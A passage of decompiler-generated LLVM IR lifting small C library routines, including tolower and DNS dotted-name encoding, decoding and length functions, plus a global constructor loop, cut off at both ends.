  uselistorder label %dec_label_pc_8054723, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8054730 = add i32 %arg1, 128
  %v6_805473b = icmp ugt i32 %v1_8054730, 383
  br i1 %v6_805473b, label %dec_label_pc_8054746, label %dec_label_pc_805473d

dec_label_pc_805473d:                             ; preds = %entry
  %v0_805473d = load i32, i32* bitcast (i32** @global_var_8058480.168 to i32*), align 128
  %v2_8054742 = mul i32 %arg1, 2
  %v3_8054742 = add i32 %v0_805473d, %v2_8054742
  %v4_8054742 = inttoptr i32 %v3_8054742 to i16*
  %v5_8054742 = load i16, i16* %v4_8054742, align 2
  %v6_8054742 = sext i16 %v5_8054742 to i32
  store i32 %v6_8054742, i32* @edx, align 4
  br label %dec_label_pc_8054746

dec_label_pc_8054746:                             ; preds = %entry, %dec_label_pc_805473d
  %v0_8054746 = phi i32 [ %arg1, %entry ], [ %v6_8054742, %dec_label_pc_805473d ]
  ret i32 %v0_8054746

; uselistorder directives
  uselistorder i32 65536, { 1, 0, 2, 3, 4, 6, 5, 8, 7, 10, 9, 12, 11, 13, 14, 60, 63, 15, 62, 16, 17, 18, 19, 20, 23, 24, 22, 21, 25, 26, 27, 28, 31, 32, 30, 29, 33, 36, 35, 34, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 48, 51, 52, 53, 49, 54, 50, 56, 55, 57, 59, 58, 61 }
  uselistorder i32 128, { 17, 8, 10, 3, 9, 4, 5, 11, 0, 6, 7, 12, 13, 14, 15, 16, 2, 1, 18 }
  uselistorder label %dec_label_pc_8054746, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_805474d = load i32, i32* @edi, align 4
  %v0_805474e = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_8054755 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054755, i32* @edi, align 4
  %v1_80547b45 = icmp eq i8* %arg1, null
  br i1 %v1_80547b45, label %dec_label_pc_80547bd, label %dec_label_pc_80547b8.lr.ph

dec_label_pc_80547b8.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_80547b8

dec_label_pc_805475b:                             ; preds = %dec_label_pc_80547b8
  %v5_8054760 = call i32 @__GI_strchr(i8* %v1_80547b8, i32 46)
  %v1_8054768 = icmp eq i32 %v5_8054760, 0
  br i1 %v1_8054768, label %dec_label_pc_8054774, label %dec_label_pc_805476e

dec_label_pc_805476e:                             ; preds = %dec_label_pc_805475b
  %v1_8054770 = load i32, i32* @edi, align 4
  %v2_8054770 = sub i32 %v5_8054760, %v1_8054770
  br label %dec_label_pc_8054782

dec_label_pc_8054774:                             ; preds = %dec_label_pc_805475b
  %v0_8054777 = load i32, i32* @edi, align 4
  %v5_8054777 = inttoptr i32 %v0_8054777 to i8*
  %v3_8054778 = call i32 @strlen(i8* %v5_8054777)
  br label %dec_label_pc_8054782

dec_label_pc_8054782:                             ; preds = %dec_label_pc_805476e, %dec_label_pc_8054774
  %v0_8054795 = phi i32 [ %v3_8054778, %dec_label_pc_8054774 ], [ %v2_8054770, %dec_label_pc_805476e ]
  store i32 %v0_8054795, i32* @esi, align 4
  %v1_8054782 = icmp eq i32 %v0_8054795, 0
  %v3_8054782 = trunc i32 %v0_8054795 to i8
  br i1 %v1_8054782, label %dec_label_pc_80547d1, label %dec_label_pc_8054786

dec_label_pc_8054786:                             ; preds = %dec_label_pc_8054782
  %v1_805478a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805478a = sub i32 %arg3, %v1_805478a
  %v1_805478c = add i32 %v2_805478a, -1
  %v7_805478d = icmp ult i32 %v0_8054795, %v1_805478c
  %v1_805478f = icmp eq i1 %v7_805478d, false
  br i1 %v1_805478f, label %dec_label_pc_80547d1, label %dec_label_pc_8054791

dec_label_pc_8054791:                             ; preds = %dec_label_pc_8054786
  store i32 %arg2, i32* @edx, align 4
  %v4_8054797 = add i32 %v1_805478a, %arg2
  %v5_8054797 = inttoptr i32 %v4_8054797 to i8*
  store i8 %v3_8054782, i8* %v5_8054797, align 1
  %v0_805479a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805479a = add i32 %v0_805479a, 1
  %v0_805479c = load i32, i32* @edx, align 4
  %v0_805479e = load i32, i32* @esi, align 4
  %v2_805479f = add i32 %v1_805479a, %v0_805479c
  %v0_80547a1 = load i32, i32* @edi, align 4
  %v2_80547a2 = add i32 %v0_805479e, %v1_805479a
  store i32 %v2_80547a2, i32* %ebx.global-to-local, align 4
  %tmp30 = inttoptr i32 %v2_805479f to i16*
  %v7_80547a5 = call i32 @memcpy(i16* %tmp30, i32 %v0_80547a1, i32 %v0_805479e)
  %v1_80547b1 = add i32 %v5_8054760, 1
  br i1 %v1_8054768, label %dec_label_pc_80547bd, label %dec_label_pc_80547b4

dec_label_pc_80547b4:                             ; preds = %dec_label_pc_8054791
  store i32 %v1_80547b1, i32* @edi, align 4
  %v1_80547b4 = icmp eq i32 %v1_80547b1, 0
  br i1 %v1_80547b4, label %dec_label_pc_80547bd, label %dec_label_pc_80547b8

dec_label_pc_80547b8:                             ; preds = %dec_label_pc_80547b8.lr.ph, %dec_label_pc_80547b4
  %v0_805475f = phi i32 [ %v4_8054755, %dec_label_pc_80547b8.lr.ph ], [ %v1_80547b1, %dec_label_pc_80547b4 ]
  %v1_80547b8 = inttoptr i32 %v0_805475f to i8*
  %v2_80547b8 = load i8, i8* %v1_80547b8, align 1
  %v3_80547b8 = icmp eq i8 %v2_80547b8, 0
  %v1_80547bb = icmp eq i1 %v3_80547b8, false
  br i1 %v1_80547bb, label %dec_label_pc_805475b, label %dec_label_pc_80547bd

dec_label_pc_80547bd:                             ; preds = %dec_label_pc_80547b4, %dec_label_pc_80547b8, %dec_label_pc_8054791, %entry
  %tmp31 = icmp slt i32 %arg3, 1
  br i1 %tmp31, label %dec_label_pc_80547d1, label %dec_label_pc_80547c4

dec_label_pc_80547c4:                             ; preds = %dec_label_pc_80547bd
  %v1_80547c8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80547c8 = add i32 %v1_80547c8, %arg2
  %v3_80547c8 = inttoptr i32 %v2_80547c8 to i8*
  store i8 0, i8* %v3_80547c8, align 1
  %v0_80547cc = load i32, i32* %ebx.global-to-local, align 4
  %v1_80547cc = add i32 %v0_80547cc, 1
  br label %dec_label_pc_80547d4

dec_label_pc_80547d1:                             ; preds = %dec_label_pc_8054786, %dec_label_pc_8054782, %dec_label_pc_80547bd
  br label %dec_label_pc_80547d4

dec_label_pc_80547d4:                             ; preds = %dec_label_pc_80547c4, %dec_label_pc_80547d1
  %storemerge3 = phi i32 [ %v1_80547cc, %dec_label_pc_80547c4 ], [ -1, %dec_label_pc_80547d1 ]
  store i32 %v0_805474e, i32* @esi, align 4
  store i32 %v0_805474d, i32* @edi, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i8* %v1_80547b8, { 1, 0 }
  uselistorder i32 %v1_80547b1, { 0, 2, 1 }
  uselistorder i32 %v0_805479e, { 1, 0 }
  uselistorder i32 %v5_8054760, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 2, 7, 6, 1, 0, 5, 4, 3, 8 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 3, 4, 5, 6, 7, 8, 0, 1, 2 }
  uselistorder i32 46, { 1, 2, 0, 3 }
  uselistorder i8* null, { 4, 3, 2, 7, 0, 1, 6, 8, 9, 5, 10, 11, 12 }
  uselistorder label %dec_label_pc_80547d4, { 1, 0 }
  uselistorder label %dec_label_pc_80547d1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80547bd, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80547b8, { 1, 0 }
  uselistorder label %dec_label_pc_8054782, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_80547de = load i32, i32* @esi, align 4
  %v4_80547e3 = icmp eq i32 %arg1, 0
  store i32 %arg2, i32* @edx, align 4
  br i1 %v4_80547e3, label %dec_label_pc_80548aa, label %dec_label_pc_80547f2

dec_label_pc_80547f2:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_80548922541 = add i32 %arg2, %arg1
  %v3_80548922642 = inttoptr i32 %v2_80548922541 to i8*
  %v4_80548922743 = load i8, i8* %v3_80548922642, align 1
  %v1_80548962945 = icmp eq i8 %v4_80548922743, 0
  %v1_80548983046 = icmp eq i1 %v1_80548962945, false
  br i1 %v1_80548983046, label %dec_label_pc_8054800.lr.ph, label %dec_label_pc_805489e

dec_label_pc_8054800:                             ; preds = %dec_label_pc_8054800.lr.ph, %dec_label_pc_8054819
  %v0_805480a = phi i32 [ %v0_805480a.pre, %dec_label_pc_8054800.lr.ph ], [ %v4_805482a, %dec_label_pc_8054819 ]
  %v8_805480037 = phi i1 [ %v8_80548003151, %dec_label_pc_8054800.lr.ph ], [ true, %dec_label_pc_8054819 ]
  %v5_805489236.in = phi i8 [ %v5_80548922850.in, %dec_label_pc_8054800.lr.ph ], [ %v4_8054892, %dec_label_pc_8054819 ]
  %stack_var_-17.135 = phi i8 [ %stack_var_-17.1.ph49, %dec_label_pc_8054800.lr.ph ], [ 0, %dec_label_pc_8054819 ]
  %v0_805480734 = phi i32 [ %v0_8054807.ph47, %dec_label_pc_8054800.lr.ph ], [ %v2_8054838, %dec_label_pc_8054819 ]
  %v5_805489236 = zext i8 %v5_805489236.in to i32
  %v1_8054807 = add i32 %v0_805480734, 1
  store i32 %v1_8054807, i32* @esi, align 4
  %v3_805480a = select i1 %v8_805480037, i32 2, i32 1
  %v4_805480a = add i32 %v3_805480a, %v0_805480a
  store i32 %v4_805480a, i32* %ebp.global-to-local, align 4
  %v1_805480d = and i32 %v5_805489236, 192
  %v6_8054812 = icmp eq i32 %v1_805480d, 192
  %v1_8054817 = icmp eq i1 %v6_8054812, false
  br i1 %v1_8054817, label %dec_label_pc_805483c, label %dec_label_pc_8054819

dec_label_pc_8054819:                             ; preds = %dec_label_pc_8054800
  %v2_8054826 = add i32 %v1_8054807, %arg1
  %v3_8054826 = inttoptr i32 %v2_8054826 to i8*
  %v4_8054826 = load i8, i8* %v3_8054826, align 1
  %v5_8054826 = zext i8 %v4_8054826 to i32
  %v4_805482a = add i32 %v3_805480a, %v4_805480a
  store i32 %v4_805482a, i32* %ebp.global-to-local, align 4
  %v1_805482d = mul nuw nsw i32 %v5_805489236, 256
  %v2_8054830 = and i32 %v1_805482d, 16128
  %v2_8054838 = or i32 %v5_8054826, %v2_8054830
  store i32 %v2_8054838, i32* @edx, align 4
  store i32 %v1_8054859.ph48, i32* @ecx, align 4
  %v2_8054892 = add i32 %v2_8054838, %arg1
  %v3_8054892 = inttoptr i32 %v2_8054892 to i8*
  %v4_8054892 = load i8, i8* %v3_8054892, align 1
  %v1_8054896 = icmp eq i8 %v4_8054892, 0
  %v1_8054898 = icmp eq i1 %v1_8054896, false
  br i1 %v1_8054898, label %dec_label_pc_8054800, label %dec_label_pc_805489e

dec_label_pc_805483c:                             ; preds = %dec_label_pc_8054800
  %v2_805483c = add i32 %v5_805489236, %v1_8054859.ph48
  %v1_8054841 = add i32 %v2_805483c, 1
  store i32 %v1_8054841, i32* @edi, align 4
  %v10_8054842 = icmp ult i32 %v1_8054841, %arg4
  %v1_805484a = icmp eq i1 %v10_8054842, false
  br i1 %v1_805484a, label %dec_label_pc_80548aa, label %dec_label_pc_805484c

dec_label_pc_805484c:                             ; preds = %dec_label_pc_805483c
  %v2_8054852 = add i32 %v1_8054807, %arg1
  %v2_8054859 = add i32 %v1_8054859.ph48, %arg3
  %v3_805485c = inttoptr i32 %v2_8054859 to i16*
  %v4_805485c = call i32 @memcpy(i16* %v3_805485c, i32 %v2_8054852, i32 %v5_805489236)
  %v0_8054868 = load i32, i32* %ebp.global-to-local, align 4
  %v0_8054871 = load i32, i32* @esi, align 4
  %v2_8054871 = add i32 %v0_8054871, %v5_805489236
  store i32 %v2_8054871, i32* @edx, align 4
  %v1_8054878 = icmp eq i1 %v8_805480037, false
  %v2_8054868 = select i1 %v1_8054878, i32 %v5_805489236, i32 0
  %v4_8054878 = add i32 %v0_8054868, %v2_8054868
  store i32 %v4_8054878, i32* %ebp.global-to-local, align 4
  %v4_8054889 = add i32 %v2_805483c, %arg3
  %v5_8054889 = inttoptr i32 %v4_8054889 to i8*
  store i8 46, i8* %v5_8054889, align 1
  %v0_805488c.pre = load i32, i32* @edi, align 4
  %v1_8054892.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_805488c.pre, i32* @ecx, align 4
  %v2_805489225 = add i32 %v1_8054892.pre.pre, %arg1
  %v3_805489226 = inttoptr i32 %v2_805489225 to i8*
  %v4_805489227 = load i8, i8* %v3_805489226, align 1
  %v1_805489629 = icmp eq i8 %v4_805489227, 0
  %v1_805489830 = icmp eq i1 %v1_805489629, false
  %v8_805480031 = icmp eq i8 %stack_var_-17.135, 0
  %v0_805480a.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_805489830, label %dec_label_pc_8054800.lr.ph, label %dec_label_pc_805489e

dec_label_pc_8054800.lr.ph:                       ; preds = %dec_label_pc_805484c, %dec_label_pc_80547f2
  %v0_805480a.pre = phi i32 [ 0, %dec_label_pc_80547f2 ], [ %v0_805480a.pre.pre, %dec_label_pc_805484c ]
  %v8_80548003151 = phi i1 [ false, %dec_label_pc_80547f2 ], [ %v8_805480031, %dec_label_pc_805484c ]
  %v5_80548922850.in = phi i8 [ %v4_80548922743, %dec_label_pc_80547f2 ], [ %v4_805489227, %dec_label_pc_805484c ]
  %stack_var_-17.1.ph49 = phi i8 [ 1, %dec_label_pc_80547f2 ], [ %stack_var_-17.135, %dec_label_pc_805484c ]
  %v1_8054859.ph48 = phi i32 [ 0, %dec_label_pc_80547f2 ], [ %v0_805488c.pre, %dec_label_pc_805484c ]
  %v0_8054807.ph47 = phi i32 [ %arg2, %dec_label_pc_80547f2 ], [ %v1_8054892.pre.pre, %dec_label_pc_805484c ]
  br label %dec_label_pc_8054800

dec_label_pc_805489e:                             ; preds = %dec_label_pc_805484c, %dec_label_pc_8054819, %dec_label_pc_80547f2
  %v0_80548a3 = phi i32 [ 0, %dec_label_pc_80547f2 ], [ %v4_805482a, %dec_label_pc_8054819 ], [ %v0_805480a.pre.pre, %dec_label_pc_805484c ]
  %v8_8054800.lcssa = phi i1 [ false, %dec_label_pc_80547f2 ], [ true, %dec_label_pc_8054819 ], [ %v8_805480031, %dec_label_pc_805484c ]
  %v2_80548a5 = zext i1 %v8_8054800.lcssa to i32
  %v3_80548a5 = add i32 %v0_80548a3, 1
  %v4_80548a5 = add i32 %v3_80548a5, %v2_80548a5
  br label %dec_label_pc_80548ad

dec_label_pc_80548aa:                             ; preds = %dec_label_pc_805483c, %entry
  br label %dec_label_pc_80548ad

dec_label_pc_80548ad:                             ; preds = %dec_label_pc_805489e, %dec_label_pc_80548aa
  %storemerge = phi i32 [ %v4_80548a5, %dec_label_pc_805489e ], [ -1, %dec_label_pc_80548aa ]
  store i32 %v0_80547de, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8054859.ph48, { 2, 1, 0 }
  uselistorder i8 %v4_8054892, { 1, 0 }
  uselistorder i32 %v2_8054838, { 0, 2, 1 }
  uselistorder i32 %v4_805482a, { 0, 2, 1 }
  uselistorder i32 %v5_805489236, { 2, 4, 1, 3, 5, 0 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i8 1, { 3, 16, 19, 6, 0, 18, 14, 1, 12, 13, 7, 8, 9, 10, 4, 5, 15, 2, 17, 11 }
  uselistorder i8 46, { 3, 4, 2, 0, 5, 1 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 8, 9, 10, 11, 12, 13, 14, 16, 2, 3, 20, 17, 19, 0, 1, 15, 4, 5, 6, 18, 7 }
  uselistorder i32* @edi, { 3, 169, 170, 21, 171, 172, 173, 20, 174, 175, 176, 2, 0, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 29, 5, 4, 30, 31, 32, 33, 34, 37, 35, 36, 192, 7, 193, 8, 194, 195, 6, 196, 197, 198, 199, 204, 205, 1, 200, 201, 202, 203, 206, 207, 208, 209, 102, 9, 103, 104, 105, 210, 211, 219, 220, 221, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 90, 91, 92, 93, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 10, 117, 118, 119, 120, 121, 122, 123, 323, 324, 325, 11, 326, 327, 330, 331, 280, 281, 282, 45, 46, 47, 332, 333, 334, 349, 48, 12, 49, 50, 38, 39, 40, 41, 42, 43, 44, 160, 161, 162, 163, 164, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 51, 52, 53, 54, 55, 56, 57, 305, 306, 307, 308, 309, 310, 311, 312, 13, 313, 314, 315, 316, 317, 252, 253, 14, 254, 255, 256, 257, 258, 259, 260, 271, 272, 273, 274, 275, 124, 125, 15, 126, 347, 348, 127, 128, 129, 16, 230, 231, 222, 223, 224, 225, 226, 227, 228, 229, 58, 59, 60, 232, 233, 234, 130, 131, 132, 133, 134, 135, 136, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 17, 151, 26, 27, 28, 137, 18, 138, 139, 343, 344, 345, 346, 235, 236, 237, 238, 239, 240, 152, 153, 154, 155, 212, 213, 214, 215, 216, 217, 218, 328, 329, 165, 166, 278, 279, 61, 62, 63, 283, 284, 340, 341, 342, 64, 19, 65, 66, 67, 68, 285, 286, 69, 70, 71, 335, 336, 337, 338, 339, 72, 73, 74, 77, 75, 76, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 94, 95, 96, 97, 98, 99, 100, 101, 156, 157, 158, 159, 22, 23, 24, 25, 167, 168, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 276, 277, 287, 288, 289, 318, 319, 320, 321, 322 }
  uselistorder i32 256, { 5, 6, 7, 8, 9, 47, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 46, 21, 22, 23, 24, 25, 0, 1, 26, 2, 48, 27, 28, 54, 29, 30, 4, 51, 52, 3, 31, 32, 33, 34, 49, 35, 36, 37, 38, 39, 40, 41, 42, 50, 55, 43, 53, 44, 45 }
  uselistorder i1 true, { 1, 3, 7, 8, 9, 10, 11, 12, 2, 5, 6, 4, 0 }
  uselistorder i32* @edx, { 4, 151, 152, 153, 154, 155, 156, 157, 17, 161, 159, 160, 162, 163, 164, 165, 166, 167, 168, 45, 49, 46, 47, 48, 169, 170, 171, 172, 173, 174, 175, 182, 176, 177, 178, 179, 180, 181, 1, 18, 92, 102, 103, 183, 104, 105, 106, 107, 108, 197, 184, 185, 186, 201, 202, 203, 204, 214, 5, 2, 19, 93, 109, 110, 187, 188, 6, 189, 190, 191, 192, 111, 112, 113, 114, 115, 116, 283, 284, 285, 286, 7, 287, 288, 220, 221, 52, 50, 222, 292, 293, 300, 299, 290, 82, 51, 225, 226, 8, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 9, 240, 241, 223, 224, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 10, 68, 69, 70, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 11, 267, 268, 269, 270, 271, 295, 71, 205, 206, 208, 0, 158, 207, 81, 117, 193, 194, 195, 72, 196, 118, 119, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 16, 137, 138, 120, 139, 12, 140, 141, 143, 13, 144, 145, 146, 147, 148, 44, 14, 142, 291, 198, 199, 200, 15, 149, 215, 216, 289, 150, 294, 213, 296, 282, 73, 217, 218, 74, 210, 219, 75, 297, 298, 76, 77, 78, 79, 80, 83, 84, 85, 86, 87, 88, 89, 90, 91, 94, 95, 96, 97, 98, 99, 100, 101, 20, 21, 22, 24, 25, 23, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 37, 36, 38, 39, 40, 41, 42, 43, 209, 211, 212, 272, 273, 274, 275, 277, 281, 276, 279, 280, 3, 278, 301 }
  uselistorder i32* @esi, {}
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_80548ad, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_80548c6 = icmp eq i32 %arg1, 0
  br i1 %v1_80548c6, label %dec_label_pc_80548f5, label %dec_label_pc_80548e6.preheader

dec_label_pc_80548e6.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_80548e610 = add i32 %arg2, %arg1
  %v3_80548e611 = inttoptr i32 %v2_80548e610 to i8*
  %v4_80548e612 = load i8, i8* %v3_80548e611, align 1
  %v1_80548ea14 = add i32 %arg2, 1
  %v1_80548ed15 = icmp eq i8 %v4_80548e612, 0
  %v1_80548ef16 = icmp eq i1 %v1_80548ed15, false
  br i1 %v1_80548ef16, label %dec_label_pc_80548d5, label %dec_label_pc_80548f1

dec_label_pc_80548cc:                             ; preds = %dec_label_pc_80548d5
  %v1_80548cc = add i32 %v0_80548cc17, 2
  br label %dec_label_pc_80548f1

dec_label_pc_80548d5:                             ; preds = %dec_label_pc_80548e6.preheader, %dec_label_pc_80548e6
  %v1_80548ea19 = phi i32 [ %v1_80548ea, %dec_label_pc_80548e6 ], [ %v1_80548ea14, %dec_label_pc_80548e6.preheader ]
  %v5_80548e618.in = phi i8 [ %v4_80548e6, %dec_label_pc_80548e6 ], [ %v4_80548e612, %dec_label_pc_80548e6.preheader ]
  %v0_80548cc17 = phi i32 [ %v2_80548e3, %dec_label_pc_80548e6 ], [ %arg2, %dec_label_pc_80548e6.preheader ]
  %v5_80548e618 = zext i8 %v5_80548e618.in to i32
  %v1_80548d7 = and i32 %v5_80548e618, 192
  %v6_80548dc = icmp eq i32 %v1_80548d7, 192
  %v2_80548e3 = add i32 %v5_80548e618, %v1_80548ea19
  br i1 %v6_80548dc, label %dec_label_pc_80548cc, label %dec_label_pc_80548e6

dec_label_pc_80548e6:                             ; preds = %dec_label_pc_80548d5
  store i32 %v2_80548e3, i32* @ecx, align 4
  %v2_80548e6 = add i32 %v2_80548e3, %arg1
  %v3_80548e6 = inttoptr i32 %v2_80548e6 to i8*
  %v4_80548e6 = load i8, i8* %v3_80548e6, align 1
  %v1_80548ea = add i32 %v2_80548e3, 1
  %v1_80548ed = icmp eq i8 %v4_80548e6, 0
  %v1_80548ef = icmp eq i1 %v1_80548ed, false
  br i1 %v1_80548ef, label %dec_label_pc_80548d5, label %dec_label_pc_80548f1

dec_label_pc_80548f1:                             ; preds = %dec_label_pc_80548e6.preheader, %dec_label_pc_80548e6, %dec_label_pc_80548cc
  %v0_80548f1 = phi i32 [ %v1_80548cc, %dec_label_pc_80548cc ], [ %v1_80548ea14, %dec_label_pc_80548e6.preheader ], [ %v1_80548ea, %dec_label_pc_80548e6 ]
  %v2_80548f3 = sub i32 %v0_80548f1, %arg2
  br label %dec_label_pc_80548f5

dec_label_pc_80548f5:                             ; preds = %entry, %dec_label_pc_80548f1
  %v0_80548f8 = phi i32 [ -1, %entry ], [ %v2_80548f3, %dec_label_pc_80548f1 ]
  ret i32 %v0_80548f8

; uselistorder directives
  uselistorder i8 %v4_80548e6, { 1, 0 }
  uselistorder i32 %v2_80548e3, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 2, 1, 3 }
  uselistorder i32 2, { 133, 48, 134, 76, 138, 139, 45, 46, 47, 0, 1, 135, 140, 141, 142, 111, 143, 144, 145, 146, 147, 148, 117, 2, 118, 119, 52, 149, 150, 3, 77, 53, 123, 124, 72, 151, 152, 153, 155, 112, 168, 169, 58, 125, 126, 73, 8, 9, 62, 63, 176, 59, 110, 7, 78, 104, 79, 105, 80, 106, 54, 10, 122, 50, 81, 11, 12, 64, 13, 14, 120, 15, 16, 17, 65, 171, 18, 19, 74, 20, 156, 157, 158, 159, 4, 66, 166, 167, 136, 137, 162, 163, 55, 56, 57, 21, 177, 67, 5, 6, 127, 128, 61, 22, 23, 129, 24, 130, 25, 68, 131, 132, 26, 154, 170, 175, 75, 27, 121, 28, 82, 85, 83, 84, 86, 29, 30, 31, 32, 33, 34, 35, 36, 37, 69, 38, 39, 40, 41, 42, 43, 87, 107, 88, 70, 89, 108, 90, 91, 109, 60, 92, 93, 94, 113, 114, 115, 116, 95, 96, 97, 98, 160, 49, 161, 164, 99, 51, 165, 100, 101, 102, 174, 71, 172, 44, 173, 103 }
  uselistorder i8 0, { 39, 4, 7, 8, 40, 6, 5, 153, 154, 10, 161, 156, 157, 9, 159, 160, 158, 31, 162, 1, 2, 61, 62, 63, 163, 164, 34, 166, 11, 13, 87, 86, 12, 41, 167, 168, 169, 98, 99, 16, 177, 173, 174, 172, 14, 175, 176, 15, 32, 178, 179, 188, 189, 190, 191, 192, 203, 204, 18, 89, 88, 17, 90, 91, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 3, 199, 116, 117, 225, 118, 228, 42, 56, 37, 38, 79, 19, 227, 209, 210, 64, 211, 212, 213, 214, 215, 216, 43, 217, 21, 197, 198, 20, 155, 119, 120, 57, 29, 28, 0, 44, 45, 46, 121, 193, 77, 165, 183, 184, 180, 182, 181, 122, 123, 124, 125, 126, 127, 128, 129, 130, 22, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 30, 144, 145, 146, 147, 148, 149, 150, 151, 59, 226, 185, 186, 187, 152, 170, 171, 65, 66, 23, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 78, 80, 81, 82, 83, 84, 85, 92, 93, 94, 95, 96, 97, 58, 35, 194, 195, 196, 200, 201, 202, 24, 205, 206, 36, 207, 33, 208, 218, 223, 222, 25, 219, 220, 27, 221, 26, 224, 60, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* @ecx, { 26, 5, 7, 25, 6, 119, 120, 13, 121, 122, 123, 124, 14, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 36, 43, 37, 38, 39, 40, 41, 42, 141, 142, 8, 9, 50, 1, 51, 60, 11, 17, 143, 144, 15, 10, 16, 145, 150, 151, 152, 153, 154, 157, 158, 159, 160, 12, 52, 2, 53, 61, 62, 30, 63, 147, 148, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 27, 89, 90, 91, 92, 28, 93, 24, 18, 46, 47, 48, 49, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 19, 185, 161, 162, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 20, 201, 202, 204, 205, 206, 207, 203, 210, 155, 0, 31, 32, 146, 94, 95, 96, 97, 98, 99, 100, 29, 101, 102, 103, 104, 105, 106, 21, 22, 3, 4, 107, 108, 23, 109, 110, 111, 112, 113, 115, 116, 117, 118, 34, 35, 114, 208, 149, 209, 211, 212, 213, 33, 44, 45, 54, 55, 56, 57, 58, 59, 156 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80548f5, { 1, 0 }
  uselistorder label %dec_label_pc_80548f1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80548d5, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_805490c = load i32, i32* @global_var_8058000.211, align 32768
  %v10_8054911 = icmp eq i32 %v0_805490c, -1
  br i1 %v10_8054911, label %dec_label_pc_805492c, label %dec_label_pc_8054920.preheader

dec_label_pc_8054920.preheader:                   ; preds = %entry
  br label %dec_label_pc_8054920

dec_label_pc_8054920:                             ; preds = %dec_label_pc_8054920.preheader, %dec_label_pc_8054920
  %v4_8054923 = phi i32 [ %v0_805490c, %dec_label_pc_8054920.preheader ], [ %v2_8054925, %dec_label_pc_8054920 ]
  %v0_8054920 = phi i32 [ ptrtoint (i32* @global_var_8058000.211 to i32), %dec_label_pc_8054920.preheader ], [ %v1_8054920, %dec_label_pc_8054920 ]
  %v1_8054920 = add i32 %v0_8054920, -4
  call void @__pseudo_call(i32 %v4_8054923)
  %v1_8054925 = inttoptr i32 %v1_8054920 to i32*
  %v2_8054925 = load i32, i32* %v1_8054925, align 4
  %v10_8054927 = icmp eq i32 %v2_8054925, -1
  %v1_805492a = icmp eq i1 %v10_8054927, false
  br i1 %v1_805492a, label %dec_label_pc_8054920, label %dec_label_pc_805492c.loopexit

dec_label_pc_805492c.loopexit:                    ; preds = %dec_label_pc_8054920
  %v2_805492c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_805492c

